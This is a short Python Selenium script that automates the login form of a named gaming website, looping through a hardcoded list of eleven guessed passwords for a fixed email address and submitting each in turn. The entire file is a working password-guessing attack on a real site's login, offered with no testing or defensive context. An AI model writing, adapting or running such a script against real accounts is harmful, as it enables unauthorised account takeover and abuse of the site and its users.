from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from openpyxl import load_workbook 
import time

mail="novado9443@otozuz.com"
contra=["fgsdfsf","fsfdsjhks","fdsfjldfhsj","fsdjfdafkds","fkfdlsksalf","4982332942","fkdslfsldskf","fldksfksldkkl","54h3j543h54j3k","isjPHt4K"," 4kit44ki4"]

driver = webdriver.Chrome(executable_path=r"C:\driver_chrome\chromedriver.exe")
driver.get("https://tibiachile.cl/")
driver.set_window_size(1024, 600)
driver.maximize_window()

time.sleep(4)
driver.find_element_by_xpath("/html/body/div[2]/div/div/a").click()
time.sleep(2)
driver.find_element_by_xpath("/html/body/div/div[1]/div[1]/div/div[2]/p/a").click()

for i in contra:
    time.sleep(2)

    correo= driver.find_element_by_xpath("/html/body/div/div[1]/div[2]/div[2]/form[2]/fieldset/div/p[1]/span/input")

    pssw= driver.find_element_by_xpath("/html/body/div/div[1]/div[2]/div[2]/form[2]/fieldset/div/p[2]/span/input")
    correo.clear()
    correo.send_keys(mail)
    time.sleep(1)
    pssw.clear()
    pssw.send_keys(i)
    time.sleep(1)
    driver.find_element_by_xpath("/html/body/div/div[1]/div[2]/div[2]/form[2]/fieldset/div/p[4]/input[2]").click()
    time.sleep(2)


